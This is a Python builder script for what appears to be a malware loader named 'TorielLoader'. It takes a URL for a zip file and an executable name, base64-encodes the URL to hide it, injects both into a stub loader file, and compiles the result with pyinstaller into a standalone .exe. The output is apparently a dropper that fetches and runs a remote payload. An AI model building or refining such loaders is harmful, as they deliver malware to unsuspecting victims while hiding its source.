import os
import sys
import colorama
from colorama import Fore, Style
import re
import base64

def main():
    url = input('URL for zip file: ')
    if not url:
        print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)
        sys.exit(1)

    exename = input('EXE name to look for (DONT ADD THE EXE EXTENSION): ')
    if not exename:
        print(Fore.RED + '[-] You must prvide an EXE name.')
        sys.exit(1)

    try:
        encoded_url = base64.b64encode(url.encode()).decode()
        with open('stub/loader.py', 'r') as file:
            content = file.read()

        content = content.replace('TORIEL_URL_HERE', f'"{encoded_url}"')
        content = content.replace('TORIEL_NAME_FOR_EXE', f'"{exename}"')

        if not os.path.exists('dist'):
            os.mkdir('dist')

        with open('dist/built_loader.py', 'w') as out:
            out.write(content)

        print(Fore.GREEN + '[+] Loader built successfully: dist/built_loader.py' + Style.RESET_ALL)
        print(Fore.BLUE + '[*] Now building the executable...' + Style.RESET_ALL)
        os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name TorielLoader')
        print(Fore.GREEN + '[+] Executable built successfully: dist/TorielLoader.exe' + Style.RESET_ALL)

    except FileNotFoundError:
        print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
        sys.exit(1)

    except Exception as e:
        print(Fore.RED + f'[-] Error: {e}' + Style.RESET_ALL)
        sys.exit(1)